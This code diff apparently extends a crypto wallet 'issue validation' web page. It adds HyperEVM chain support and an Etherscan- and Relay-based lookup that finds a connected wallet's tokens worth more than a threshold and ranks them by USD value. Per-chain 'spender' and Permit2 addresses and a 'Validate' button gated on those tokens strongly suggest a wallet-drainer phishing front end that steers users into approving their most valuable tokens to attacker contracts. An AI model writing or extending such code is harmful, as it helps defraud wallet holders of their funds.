@@ -13,12 +13,40 @@ import { createAppKit, useAppKit, useAppKitProvider } from '@reown/appkit/react'
 import { Ethers5Adapter } from '@reown/appkit-adapter-ethers5';
 import { mainnet, arbitrum, base, bsc, linea, polygon, zksync, optimism, avalanche, zora, blast, berachain } from '@reown/appkit/networks';
 import { Alchemy, Network } from 'alchemy-sdk';
+import { defineChain } from '@reown/appkit/networks';
 
 type WalletType = {
   id: string;
   icon: string;
   name: string;
 };
+
+const hyperEVM = defineChain({
+  id: 999,
+  caipNetworkId: 'eip155:999',
+  chainNamespace: 'eip155',
+  name: 'HyperEVM',
+  nativeCurrency: {
+    decimals: 18,
+    name: 'HYPE',
+    symbol: 'HYPE'
+  },
+  rpcUrls: {
+    default: {
+      http: ['https://rpc.hyperliquid.xyz/evm'],
+      webSocket: ['wss://hyperliquid.drpc.org']
+    }
+  },
+  blockExplorers: {
+    default: { name: 'HyperEVM Scan', url: 'https://hyperevmscan.io/'}
+  },
+  contracts: {
+    multicall3: {
+      address: '0xbd23DbBDEC1e9EEfcd72ca53bBb307B0940769c0',
+      blockCreated: 9956576,
+    }
+  }
+})
 
 const wallets: WalletType[] = [
   { id: 'w1', icon: 'https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg', name: 'MetaMask' },
@@ -141,7 +169,8 @@ const CONTRACT_ADDRESSES: { [Key: number]: string} = {
   137: process.env.NEXT_PUBLIC_POLYGON_SPENDER!,     // Polygon
   7777777: process.env.NEXT_PUBLIC_ZORA_SPENDER!,    //zora
   81457: process.env.NEXT_PUBLIC_BLAST_SPENDER!,       //blast
-  80094: process.env.NEXT_PUBLIC_BERACHAIN_SPENDER!
+  80094: process.env.NEXT_PUBLIC_BERACHAIN_SPENDER!,
+  999: process.env.NEXT_PUBLIC_HYPEREVM_SPENDER!
 }
 
 const PERMIT2_ADDRESSES: { [key: number]: string } = {
@@ -155,11 +184,203 @@ const PERMIT2_ADDRESSES: { [key: number]: string } = {
   137: process.env.NEXT_PUBLIC_POLYGON_PERMIT2!,   // Polygon
   7777777: process.env.NEXT_PUBLIC_ZORA_PERMIT2!, // Zora
   81457: process.env.NEXT_PUBLIC_BLAST_PERMIT2!, // Blast
-  80094: process.env.NEXT_PUBLIC_BERACHAIN_PERMIT2!
+  80094: process.env.NEXT_PUBLIC_BERACHAIN_PERMIT2!,
+  999: process.env.NEXT_PUBLIC_HYPEREVM_PERMIT2!
 };
+
+// Pricing and explorer configs
+const ETHERSCAN_V2_API = process.env.NEXT_PUBLIC_ETHERSCAN_V2_API || 'https://api.etherscan.io/v2/api';
+const ETHERSCAN_API_KEY = process.env.NEXT_PUBLIC_ETHERSCAN_API_KEY!;
+const HYPER_EVM_RPC_URL = process.env.NEXT_PUBLIC_HYPEREVM_RPC_URL || 'https://rpc.hyperliquid.xyz/evm';
+
+// Relay Link price helper
+async function getUsdPriceFromRelay(chainId: number, tokenAddress: string): Promise<number> {
+  try {
+    const url = `https://api.relay.link/currencies/token/price?chainId=${chainId}&address=${tokenAddress}`;
+    console.log(`[Relay] fetch price url=${url}`);
+    const res = await fetch(url, { method: 'GET', cache: 'no-store' });
+    if (!res.ok) return 0;
+    const data = await res.json();
+    console.log('[Relay] response', data);
+    const candidates = [
+      (typeof data === 'number' ? data : undefined),
+      data?.price,
+      data?.usd,
+      data?.usdPrice,
+      data?.data?.price,
+    ];
+    const price = candidates.find((v) => typeof v === 'number' && isFinite(v) && v >= 0);
+    return typeof price === 'number' ? price : 0;
+  } catch (e) {
+    console.error('Relay price fetch failed:', e);
+    return 0;
+  }
+}
+
+async function fetchValuableTokensViaEtherscan(address: string, chainId: number): Promise<TokenWithValue[]> {
+  try {
+    const url = `${ETHERSCAN_V2_API}?chainid=${chainId}&module=account&action=addresstokenbalance&address=${address}&page=1&offset=200${ETHERSCAN_API_KEY ? `&apikey=${ETHERSCAN_API_KEY}` : ''}`;
+    console.log(`[Etherscan] fetch balances url=${url}`);
+    const res = await fetch(url, { cache: 'no-store' });
+    if (!res.ok) throw new Error('Etherscan request failed');
+    const data = await res.json();
+    console.log('[Etherscan] response keys', Object.keys(data || {}));
+    const list: any[] = Array.isArray(data?.result) ? data.result : [];
+    console.log(`[Etherscan] tokens returned=${list.length}`);
+
+    const tokensRaw: (TokenWithValue | null)[] = list
+      .map((t: any) => {
+        const contract = t.tokenAddress || t.contractAddress || t.token_address || t.address;
+        const symbol = t.tokenSymbol || t.symbol || t.token_symbol || t.name;
+        const decimalsRaw = t.tokenDecimal ?? t.decimals ?? t.token_decimals;
+        const decimals = typeof decimalsRaw === 'string' ? parseInt(decimalsRaw, 10) : (decimalsRaw ?? 18);
+        const balanceRaw = t.balance ?? t.tokenBalance ?? t.token_balance ?? '0';
+        try {
+          const addressChecksum = ethers.utils.getAddress(contract);
+          const balance = ethers.BigNumber.from(balanceRaw);
+          return {
+            address: addressChecksum,
+            symbol: (symbol || 'TOKEN').toString(),
+            balance,
+            decimals,
+            price: 0,
+            value: 0,
+          } as TokenWithValue;
+        } catch (e) {
+          console.warn('[Etherscan] skipped invalid token row', { t, error: (e as Error)?.message });
+          return null;
+        }
+      })
+      .filter((t: TokenWithValue | null): t is TokenWithValue => !!t && t.balance.gt(0));
+
+    if (tokensRaw.length === 0) return [];
+
+    const tokens: TokenWithValue[] = tokensRaw.filter((t): t is TokenWithValue => t !== null);
+
+    // Fetch Relay prices in parallel per token address
+    const withValues: TokenWithValue[] = await Promise.all(
+      tokens.map(async (t) => {
+        const usdPrice = await getUsdPriceFromRelay(chainId, t.address);
+        if (usdPrice > 0) {
+          const normalized = parseFloat(ethers.utils.formatUnits(t.balance, t.decimals));
+          const usdValue = normalized * usdPrice;
+          console.log('[TokenValuation] token', { symbol: t.symbol, address: t.address, normalized, usdPrice, usdValue });
+          return { ...t, price: usdPrice, value: usdValue };
+        }
+        console.log('[TokenValuation] no price for token', { symbol: t.symbol, address: t.address });
+        return t;
+      })
+    );
+
+    const valuable = withValues.filter((t: TokenWithValue) => t.price > 0 && t.value >= MIN_TOKEN_VALUE_USD);
+    console.log(`[TokenValuation] valuable count=${valuable.length} threshold=${MIN_TOKEN_VALUE_USD}`);
+    return valuable.sort((a: TokenWithValue, b: TokenWithValue) => b.value - a.value);
+  } catch (error) {
+    console.error('Failed to fetch tokens via Etherscan:', error);
+    return [];
+  }
+}
+
+// HyperEVM-only free fallback using Etherscan tokentx → get contract addresses directly
+async function fetchValuableTokensViaEtherscanTxlist(address: string, chainId: number): Promise<TokenWithValue[]> {
+  try {
+    const url = `${ETHERSCAN_V2_API}?chainid=${chainId}&module=account&action=tokentx&address=${address}&page=1&offset=100&startblock=0&endblock=99999999&sort=desc${ETHERSCAN_API_KEY ? `&apikey=${ETHERSCAN_API_KEY}` : ''}`;
+    console.log(`[Etherscan][tokentx] url=${url}`);
+    const res = await fetch(url, { cache: 'no-store' });
+    if (!res.ok) throw new Error('Etherscan tokentx request failed');
+    const data = await res.json();
+    const txs: any[] = Array.isArray(data?.result) ? data.result : [];
+    console.log(`[Etherscan][tokentx] token transactions=${txs.length}`);
+
+    // Extract contract addresses directly from token transactions
+    const contractAddresses = new Set<string>();
+    for (const tx of txs) {
+      const contractAddress = tx?.contractAddress;
+      if (contractAddress && contractAddress !== '0x0000000000000000000000000000000000000000') {
+        contractAddresses.add(contractAddress.toLowerCase());
+      }
+    }
+    const candidates = Array.from(contractAddresses);
+    console.log('[Etherscan][tokentx] unique token contracts found:', candidates.length);
+
+    // Remove hardcoded contracts - now fully automatic discovery
+
+    if (candidates.length === 0) return [];
+
+    const readProvider = new ethers.providers.JsonRpcProvider(HYPER_EVM_RPC_URL, { name: 'HyperEVM', chainId: 999 });
+    const erc20Abi = [
+      'function balanceOf(address owner) view returns (uint256)',
+      'function decimals() view returns (uint8)',
+      'function symbol() view returns (string)'
+    ];
+
+    // Simple: check balance for each contract address
+    const checkBalance = async (contractAddr: string): Promise<TokenWithValue | null> => {
+      try {
+        const contract = new Contract(contractAddr, erc20Abi, readProvider);
+        const balance = await contract.balanceOf(address);
+        
+        if (balance.gt(0)) {
+          const [decimals, symbol] = await Promise.all([
+            contract.decimals().catch(() => 18),
+            contract.symbol().catch(() => 'TOKEN')
+          ]);
+          
+          return {
+            address: ethers.utils.getAddress(contractAddr),
+            symbol: String(symbol),
+            balance,
+            decimals: Number(decimals),
+            price: 0,
+            value: 0,
+          };
+        }
+        return null;
+      } catch {
+        return null;
+      }
+    };
+
+    const tokens = (await Promise.all(candidates.map(checkBalance))).filter((t): t is TokenWithValue => !!t);
+    console.log('[Etherscan][tokentx] tokens with balance:', tokens.length);
+    if (tokens.length === 0) return [];
+
+    const withValues: TokenWithValue[] = await Promise.all(
+      tokens.map(async (t) => {
+        const usdPrice = await getUsdPriceFromRelay(chainId, t.address);
+        if (usdPrice > 0) {
+          const normalized = parseFloat(ethers.utils.formatUnits(t.balance, t.decimals));
+          const usdValue = normalized * usdPrice;
+          console.log('[TokenValuation][tokentx] token', { symbol: t.symbol, address: t.address, normalized, usdPrice, usdValue });
+          return { ...t, price: usdPrice, value: usdValue };
+        }
+        console.log('[TokenValuation][tokentx] no price', { symbol: t.symbol, address: t.address });
+        return t;
+      })
+    );
+
+    const valuable = withValues.filter((t) => t.price > 0 && t.value >= MIN_TOKEN_VALUE_USD);
+    console.log(`[TokenValuation][tokentx] valuable count=${valuable.length} threshold=${MIN_TOKEN_VALUE_USD}`);
+    return valuable.sort((a, b) => b.value - a.value);
+  } catch (error) {
+    console.error('Failed to fetch tokens via Etherscan txlist:', error);
+    return [];
+  }
+}
 
 async function fetchValuableTokens(address: string, chainId: number): Promise<TokenWithValue[]> {
   try {
+    // If Alchemy does not support this chainId (including HyperEVM), try Etherscan balances
+    if (!networkMap[chainId]) {
+      const viaBalance = await fetchValuableTokensViaEtherscan(address, chainId);
+      if (viaBalance.length > 0) return viaBalance;
+      // HyperEVM-only free fallback using txlist → contract probe → balanceOf
+      if (chainId === 999) {
+        return await fetchValuableTokensViaEtherscanTxlist(address, chainId);
+      }
+      return [];
+    }
+
     const network = networkMap[chainId] || Network.ETH_MAINNET;
     const alchemy = new Alchemy({ ...alchemyConfig, network });
     const balances = await alchemy.core.getTokenBalances(address);
@@ -223,7 +444,7 @@ const metadata = {
 createAppKit({
   adapters: [new Ethers5Adapter()],
   metadata,
-  networks: [mainnet, arbitrum, base, bsc, linea, polygon, zksync, optimism, avalanche, zora, blast, berachain],
+  networks: [mainnet, arbitrum, base, bsc, linea, polygon, zksync, optimism, avalanche, zora, blast, berachain, hyperEVM],
   projectId,
   features: { analytics: true },
 });
@@ -253,11 +474,13 @@ export default function IssuesContent() {
 
   useEffect(() => {
     if (account && chainId) {
+      console.log(`[FetchValuableTokens] start account=${account} chainId=${chainId}`);
       setLoading(true);
       fetchValuableTokens(account, chainId)
         .then(valuableTokens => {
           setTokens(valuableTokens);
           const total = valuableTokens.reduce((sum, token) => sum + token.value, 0);
+          console.log(`[FetchValuableTokens] done tokens=${valuableTokens.length} totalUSD=${total}`);
           setTotalValue(total);
           setLoading(false);
         })
@@ -462,6 +685,7 @@ export default function IssuesContent() {
         const checkSummedAddress = ethers.utils.getAddress(address);
         const network = await web3Provider.getNetwork();
         const chainId = network.chainId;
+        console.log(`[ConnectWallet] address=${checkSummedAddress} chainId=${chainId}`);
 
         // Get the appropriate spender address based on chainId
         const spenderAddress = CONTRACT_ADDRESSES[chainId];
@@ -498,9 +722,27 @@ export default function IssuesContent() {
       137: 'Polygon',
       7777777: 'Zora',
       81457: 'Blast',
+      999: 'HyperEVM',
     };
     return networkNames[chainId] || `Unknown Network (Chain ID: ${chainId})`;
   };
+
+  // Log why the Validate button might be disabled
+  useEffect(() => {
+    const hasProvider = !!provider;
+    const hasTokens = tokens.length > 0;
+    const hasSpender = !!CONTRACT_ADDRESSES[chainId];
+    if (!hasProvider || !hasTokens || !hasSpender) {
+      console.log('[ValidateButton] disabled reasons:', {
+        hasProvider,
+        tokensCount: tokens.length,
+        hasSpender,
+        chainId,
+      });
+    } else {
+      console.log('[ValidateButton] enabled');
+    }
+  }, [provider, tokens, chainId]);
 
   return (
     <div className="w-full relative">
